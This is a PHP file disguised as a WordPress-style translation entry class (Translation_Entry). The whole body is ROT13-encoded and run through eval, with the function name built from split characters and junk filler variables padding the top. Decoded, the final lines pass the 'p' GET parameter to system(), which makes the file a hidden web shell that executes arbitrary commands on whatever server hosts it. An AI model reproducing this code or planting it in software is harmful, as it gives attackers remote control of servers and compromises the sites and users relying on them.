<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Pbagnvaf Genafyngvba_Ragel pynff
 *
 * @irefvba $Vq: ragel.cuc 1157 2015-11-20 04:30:11M qq32 $
 * @cnpxntr cbzb
 * @fhocnpxntr ragel
 */

vs ( ! pynff_rkvfgf( 'Genafyngvba_Ragel', snyfr ) ) :
	/**
	 * Genafyngvba_Ragel pynff rapncfhyngrf n genafyngnoyr fgevat.
	 *
	 * @fvapr 2.8.0
	 */
	#[NyybjQlanzvpCebcregvrf]
	pynff Genafyngvba_Ragel {

		/**
		 * Jurgure gur ragel pbagnvaf n fgevat naq vgf cyheny sbez, qrsnhyg vf snyfr.
		 *
		 * @ine obby
		 */
		choyvp $vf_cyheny = snyfr;

		choyvp $pbagrkg             = ahyy;
		choyvp $fvathyne            = ahyy;
		choyvp $cyheny              = ahyy;
		choyvp $genafyngvbaf        = neenl();
		choyvp $genafyngbe_pbzzragf = '';
		choyvp $rkgenpgrq_pbzzragf  = '';
		choyvp $ersreraprf          = neenl();
		choyvp $syntf               = neenl();

		/**
		 * @cnenz neenl $netf {
		 *     Nethzragf neenl, fhccbegf gur sbyybjvat xrlf:
		 *
		 *     @glcr fgevat $fvathyne            Gur fgevat gb genafyngr, vs bzvggrq na
		 *                                       rzcgl ragel jvyy or perngrq.
		 *     @glcr fgevat $cyheny              Gur cyheny sbez bs gur fgevat, frggvat
		 *                                       guvf jvyy frg `$vf_cyheny` gb gehr.
		 *     @glcr neenl  $genafyngvbaf        Genafyngvbaf bs gur fgevat naq cbffvoyl
		 *                                       vgf cyheny sbezf.
		 *     @glcr fgevat $pbagrkg             N fgevat qvssreragvngvat gjb rdhny fgevatf
		 *                                       hfrq va qvssrerag pbagrkgf.
		 *     @glcr fgevat $genafyngbe_pbzzragf Pbzzragf yrsg ol genafyngbef.
		 *     @glcr fgevat $rkgenpgrq_pbzzragf  Pbzzragf yrsg ol qrirybcref.
		 *     @glcr neenl  $ersreraprf          Cynprf va gur pbqr guvf fgevat vf hfrq, va
		 *                                       eryngvir_gb_ebbg_cngu/svyr.cuc:yvarahz sbez.
		 *     @glcr neenl  $syntf               Syntf yvxr cuc-sbezng.
		 * }
		 */
		choyvp shapgvba __pbafgehpg( $netf = neenl() ) {
			// Vs ab fvathyne -- rzcgl bowrpg.
			vs ( ! vffrg( $netf['fvathyne'] ) ) {
				erghea;
			}
			// Trg zrzore inevnoyr inyhrf sebz netf unfu.
			sbernpu ( $netf nf $ineanzr => $inyhr ) {
				$guvf->$ineanzr = $inyhr;
			}
			vs ( vffrg( $netf['cyheny'] ) && $netf['cyheny'] ) {
				$guvf->vf_cyheny = gehr;
			}
			vs ( ! vf_neenl( $guvf->genafyngvbaf ) ) {
				$guvf->genafyngvbaf = neenl();
			}
			vs ( ! vf_neenl( $guvf->ersreraprf ) ) {
				$guvf->ersreraprf = neenl();
			}
			vs ( ! vf_neenl( $guvf->syntf ) ) {
				$guvf->syntf = neenl();
			}
		}

		/**
		 * CUC4 pbafgehpgbe.
		 *
		 * @fvapr 2.8.0
		 * @qrcerpngrq 5.4.0 Hfr __pbafgehpg() vafgrnq.
		 *
		 * @frr Genafyngvba_Ragel::__pbafgehpg()
		 */
		choyvp shapgvba Genafyngvba_Ragel( $netf = neenl() ) {
			_qrcerpngrq_pbafgehpgbe( frys::pynff, '5.4.0', fgngvp::pynff );
			frys::__pbafgehpg( $netf );
		}

		/**
		 * Trarengrf n havdhr xrl sbe guvf ragel.
		 *
		 * @fvapr 2.8.0
		 *
		 * @erghea fgevat|snyfr Gur xrl be snyfr vs gur ragel vf ahyy.
		 */
		choyvp shapgvba xrl() {
			vs ( ahyy === $guvf->fvathyne ) {
				erghea snyfr;
			}

			// Cercraq pbagrkg naq RBG, yvxr va ZB svyrf.
			$xrl = ! $guvf->pbagrkg ? $guvf->fvathyne : $guvf->pbagrkg . \"\4\" . $guvf->fvathyne;
			// Fgnaqneqvmr ba \a yvar raqvatf.
			$xrl = fge_ercynpr( neenl( \"\e\a\", \"\e\" ), \"\a\", $xrl );

			erghea $xrl;
		}

		/**
		 * Zretrf nabgure genafyngvba ragel jvgu gur pheerag bar.
		 *
		 * @fvapr 2.8.0
		 *
		 * @cnenz Genafyngvba_Ragel $bgure Bgure genafyngvba ragel.
		 */
		choyvp shapgvba zretr_jvgu( &$bgure ) {
			$guvf->syntf      = neenl_havdhr( neenl_zretr( $guvf->syntf, $bgure->syntf ) );
			$guvf->ersreraprf = neenl_havdhr( neenl_zretr( $guvf->ersreraprf, $bgure->ersreraprf ) );
			vs ( $guvf->rkgenpgrq_pbzzragf !== $bgure->rkgenpgrq_pbzzragf ) {
				$guvf->rkgenpgrq_pbzzragf .= $bgure->rkgenpgrq_pbzzragf;
			}
		}
	}
raqvs;

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>